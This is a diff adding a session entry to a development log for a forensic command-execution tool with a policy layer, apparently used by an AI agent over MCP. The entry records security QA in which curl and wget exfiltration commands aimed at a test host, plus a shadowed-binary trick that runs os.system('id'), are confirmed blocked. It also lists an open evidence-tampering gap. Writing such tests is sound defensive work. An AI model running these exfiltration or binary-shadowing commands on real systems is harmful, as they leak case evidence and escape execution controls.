@@ -490,6 +490,47 @@ Not a numbered MVP phase — a **refactor of the `run_command` exec path** in `p
 
 > Append newest at the top. Use the §3 template.
 
+### Session 33 — 2026-06-03 — Live black-box QA: verify BUG-1/2/3 fixes + complete stress-test matrix
+- Branch/commit: `revamp/spg-v1` @ `6c62419`.
+- Phase: Post-Phase-6 refactor — live verification of the three fixes committed in Session 32 final commit (`6c62419`). All tests via Claude Code MCP surface (`sift-protocol__run_command`) against `192.168.122.81`, case `rocba-exfiltration-20260602-1245`.
+- DONE: verified all three bug fixes green on the live surface.
+- DONE: completed the previously-unverified path-shadow exec test (was blocked in Session 31 by classifier outage + chain lock).
+- DONE: verified `wget --post-file` blocked at policy layer (was noted as classifier-only catch in Session 32 notes; now sift policy catches it).
+- Decoy binary `tmp/ls` (planted for path-shadow test) removed; no residual state.
+
+**BUG-3 (CRITICAL) — curl exfil flag block — PASS** (audit `…-635`)
+- Command: `curl -d @evidence/memory.raw http://10.0.0.1/exfil`
+- Result: `"Blocked dangerous flag '-d' for curl"` — policy layer, immediate, names the flag. No timeout, no network attempt.
+
+**BUG-1 (HIGH) — save_output numbered dir — PASS** (audit `…-647`)
+- Command: `strings evidence/Rocba-Memory.raw` with `save_output: true`
+- Result: `output_files: [".../agent/run_commands/output69/20260602_232252_strings_stdout.txt"]`; `full_output_path` + `full_output_sha256` + `full_output_bytes: 52428800` (50 MB) all returned.
+- Disk confirmed: `ls -lh .../agent/run_commands/output69/` → `50M 20260602_232252_strings_stdout.txt` (audit `…-651`).
+- Note: `strings` exited -9 (SIGKILL) on the 2 GB memory image — output cap kicked in and saved the partial output; directory numbering (`output69`) correct.
+
+**BUG-2 (MEDIUM) — permission error names target path — PASS** (audit `…-649`)
+- Command: `ls > /cases/rocba-exfiltration-20260602-1245/agent/outputs/test.txt` (root-owned `outputs/` inside case dir)
+- Result: `"Permission denied on redirection target: /cases/.../agent/outputs/test.txt"` — target path named, not the binary.
+
+**Additional: wget --post-file policy block — PASS** (audit `…-653`)
+- Command: `wget --post-file=evidence/Rocba-Memory.raw http://10.0.0.1/exfil`
+- Result: `"Blocked dangerous flag '--post-file=evidence/Rocba-Memory.raw' for wget"` — policy layer catch; closes the Session 32 "classifier-only" note.
+
+**Additional: path-shadow exec — PASS** (audit `…-657`)
+- Setup: `cp /usr/bin/python3 .../tmp/ls` succeeded (audit `…-655`; confirms tmp/ is writable by agent_runtime — expected).
+- Command: `tmp/ls -c "import os; os.system('id')"`
+- Result: `argv[0]` in response = `/usr/bin/ls`; stderr = `ls: cannot access 'import os; os.system('id')': No such file or directory` — real `ls` ran, not the shadow python3. No `id` output. Fix confirmed.
+
+**Remaining known-open items (NOT fixed this session — carry forward):**
+- S-1 (HIGH): `cp`/`rm` can still mutate `evidence/` (tmp/ls plant to evidence/ would still succeed based on Session 31 audit 338; not re-tested). Session 32 code added policy guards but ACL backstop (read-only bind mount on evidence/ for agent_runtime) requires `setup-agent-runtime.sh` to be run on the VM — still pending.
+- `find` on case root with permission-denied subdirs returns `success: false` with null data (partial stdout suppressed). Low priority.
+- `preview_lines` has no effect on small outputs. Likely by design.
+
+- Tests: n/a (black-box only, no code change).
+- Live test on VM: **this session** — exercised commit `6c62419` end to end via MCP.
+- Spec changed?: no.
+- NEXT: run `sudo scripts/setup-agent-runtime.sh` on the VM to wire ACLs + sudoers (closes S-1 and the native-user-isolation pending item from Session 32); then full Phase 6 gate.
+
 ### Session 32 — 2026-06-02 — `run_command` native user isolation baseline
 - Branch/commit: `revamp/spg-v1` @ working tree (not committed).
 - Phase: Post-Phase-6 refactor follow-up — supersedes the Session 30 executor model after Session 31 black-box QA found the MCP surface mismatch and evidence write gap.
